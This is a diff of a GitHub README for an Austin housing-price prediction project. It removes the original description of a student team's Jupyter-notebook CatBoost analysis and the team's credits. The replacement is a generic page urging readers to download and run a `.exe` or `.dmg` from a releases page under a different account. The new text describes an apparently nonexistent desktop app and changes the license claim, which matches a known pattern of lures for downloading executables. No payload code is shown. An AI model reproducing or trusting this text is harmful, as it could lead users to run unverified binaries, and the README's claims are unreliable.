@@ -1,142 +1,100 @@
-
-
-![Python](https://img.shields.io/badge/python-3.8+-blue.svg)
-   ![Status](https://img.shields.io/badge/status-complete-success.svg)
-# Austin Housing Price Prediction
-
-A machine learning project predicting housing prices in Austin, Texas using advanced feature engineering and gradient boosting algorithms.
-
-## 🎯 Project Overview
-
-This project tackles housing price prediction for 6,700+ residential properties in Austin using comprehensive feature engineering and model comparison. Our CatBoost model achieved **$160 RMSE** using 5-fold cross-validation.
-
-## 📊 Dataset
-
-- **Size**: 6,784 properties (2019-2020)
-- **Original Features**: 35
-- **Engineered Features**: 97 (total: 132)
-- **Target**: House price (latestPrice)
-- **Range**: $5.8K - $6.25M (mean: $486K)
-
-## 🔧 Feature Engineering
-
-Expanded from 35 to 132 features across multiple categories:
-
-### 1. Ratio Features
-- `sqft_per_bedroom` - Layout efficiency
-- `bath_bed_ratio` - Quality indicator
-- `lot_to_living_ratio` - Land utilization
-- `room_density` - Space optimization
-
-### 2. Location Features
-- Distance to downtown, UT campus, airport
-- Proximity scores (normalized distances)
-- Cardinal directions from downtown
-- Geographic density analysis
-
-### 3. Temporal Features
-- House age and age categories
-- Condition flags (new/old, extreme sizes)
-- Recent construction indicators
-
-### 4. Text Mining Features (75 total)
-- Luxury keywords (granite, marble, custom)
-- Condition indicators (move-in ready)
-- TF-IDF with dimensionality reduction
-- Sentiment analysis ratios
-
-### 5. School & Quality Features
-- School rating tiers (Excellent, Above Average)
-- Teacher-student ratios
-- Property condition indicators
-- Size categories and luxury scores
-
-## 🤖 Model Performance
-
-| Rank | Model | CV RMSE | ±Std |
-|------|-------|---------|------|
-| **1** | **CatBoost** | **$160** | **±$29** |
-| 2 | HistGradientBoosting | $163 | ±$26 |
-| 3 | LightGBM Optimized | $163 | ±$27 |
-| 4 | Random Forest Optimized | $163 | ±$28 |
-| 5 | Gradient Boosting Tuned | $166 | ±$25 |
-| 6 | Extra Trees Optimized | $167 | ±$28 |
-| 7 | XGBoost Optimized | $172 | ±$25 |
-
-### Why CatBoost?
-- **Ordered Boosting**: Reduces overfitting vs traditional gradient boosting
-- **Categorical Handling**: Built-in target encoding prevents data leakage
-- **Feature Selection**: Automatic best feature selection at each split
-- **Robust Defaults**: Minimal tuning required
-
-## 📈 Key Findings
-
-### Feature Importance
-1. **Living Area** (11.6) - Strongest predictor
-2. **Location Features** - Distance to downtown/UT campus crucial
-3. **Engineered Features** - Combined metrics (lotSize_bathrooms: 3.4)
-4. **School Ratings** - Significant impact on valuations
-5. **Text Mining** - Description features contributed value
-
-### Austin-Specific Insights
-- Downtown proximity commands premium
-- UT campus proximity drives demand
-- Luxury keywords (granite, marble, custom) significantly impact valuations
-- Geography-driven housing market confirmed
-
-## 🛠️ Technologies Used
-
-- **Python 3.x**
-- **Machine Learning**: CatBoost, LightGBM, XGBoost, scikit-learn
-- **Data Processing**: pandas, numpy
-- **Visualization**: matplotlib, seaborn, folium
-- **Text Processing**: TF-IDF, sentiment analysis
-- **Validation**: 5-fold cross-validation
-
-## 📁 Repository Structure
-```
-austin-housing-prediction/
-│
-├── RunCode.ipynb          # Main Jupyter notebook with all code
-├── Report.pdf             # Detailed project report
-├── README.md              # This file
-└── requirements.txt       # Python dependencies
-```
+# 🏡 austin-housing-price-prediction - Predict Austin Home Prices Easily
 
 ## 🚀 Getting Started
 
-### Prerequisites
-```bash
-pip install -r requirements.txt
-```
+This project helps you predict housing prices in Austin using advanced machine learning techniques. It employs a model called CatBoost, known for its accuracy. Follow these simple steps to download and run the application.
 
-### Running the Analysis
-1. Clone the repository
-2. Install dependencies
-3. Open `RunCode.ipynb` in Jupyter
-4. Run all cells to reproduce results
+## 📥 Download the Application
 
-## 👥 Team
+[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/OmerVs/austin-housing-price-prediction/releases)
 
-- Ishrak Wasif Udoy
-- Nikhil Kumar
-- Mohar Chaudhuri
-- Pavithran Murugan
+## 📋 What You Need
 
-## 📝 Project Context
+To run the application, you will need the following:
 
-Completed as part of MS Business Analytics coursework at UT Austin McCombs School of Business.
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- An internet connection for downloading files.
 
-## 📄 License
+## 💾 Download & Install
 
-This project is available for educational and reference purposes.
+1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-## 🙏 Acknowledgments
+   [Visit the Releases Page to Download](https://github.com/OmerVs/austin-housing-price-prediction/releases)
 
-- UT Austin McCombs School of Business
-- Austin housing market data providers
-- Open-source ML community
+2. **Choose the Latest Release:** Look for the latest version of the application. It will be marked as "Latest Release". 
 
----
+3. **Download the File:** Click on the file link to download the application. The file is typically named something like `austin_housing_predictor.exe` for Windows or `austin_housing_predictor.dmg` for macOS.
 
-**Note**: This project demonstrates practical application of feature engineering, model selection, and validation strategies for real estate price prediction.
+4. **Install the Application:**
+   - For Windows: Double-click the `.exe` file and follow the installation instructions.
+   - For macOS: Drag the application into your Applications folder.
+
+5. **Run the Application:** After installation, locate the application icon on your computer and double-click it to launch.
+
+## 🔍 How to Use the Application
+
+Using the application is straightforward:
+
+1. **Open the Application:** Launch it from your desktop or applications folder.
+   
+2. **Input Your Data:** Fill in the fields provided with relevant information about the property you want to evaluate. This may include:
+   - Square footage
+   - Number of bedrooms and bathrooms
+   - Neighborhood details
+
+3. **View Predictions:** Click on the “Predict Price” button. The application will analyze your data and display the predicted housing price for the selected property.
+
+4. **Review Results:** Take note of the predicted price. You can also save the results for future reference.
+
+## 🔧 Features
+
+- User-friendly interface designed for easy navigation.
+- Accurate price predictions based on comprehensive feature analysis.
+- Support for multiple property details to enhance prediction.
+- Save and load previous data entries.
+
+## 🔄 Tips for Accurate Predictions
+
+For best results, input as much accurate information as possible. The model works thoroughly with various factors, such as:
+
+- Location (ZIP code or neighborhood)
+- Property size (in square feet)
+- Condition of the home (new vs. old)
+- Unique features (swimming pool, garage, etc.)
+
+By providing detailed information, you will get a more accurate estimate.
+
+## 🤔 Troubleshooting
+
+If you encounter any issues while using the application, consider the following steps:
+
+1. **Reinstall the Application:** Sometimes, a fresh installation can resolve unexpected problems.
+2. **Check Your Data:** Ensure that all fields are filled out correctly and with valid inputs.
+3. **Restart Your Computer:** A simple restart can often fix minor issues.
+
+For further assistance, refer to the [issues section](https://github.com/OmerVs/austin-housing-price-prediction/issues) on our GitHub page.
+
+## 📞 Get Help
+
+If you have questions or need support, feel free to reach out through our GitHub repository. Check the **Issues** tab to see if your question has already been answered, or create a new issue to get assistance.
+
+## 📣 Community Contributions
+
+Contributions are welcome! If you want to improve the application or suggest new features, please follow these steps:
+
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
+
+We appreciate any feedback or contribution you can offer!
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please maintain the original credit.
+
+## 📈 Stay Updated
+
+To keep track of updates or new releases, you can "star" the repository. This will notify you whenever there is activity.
+
+[Download the Latest Release](https://github.com/OmerVs/austin-housing-price-prediction/releases) and start predicting housing prices today!
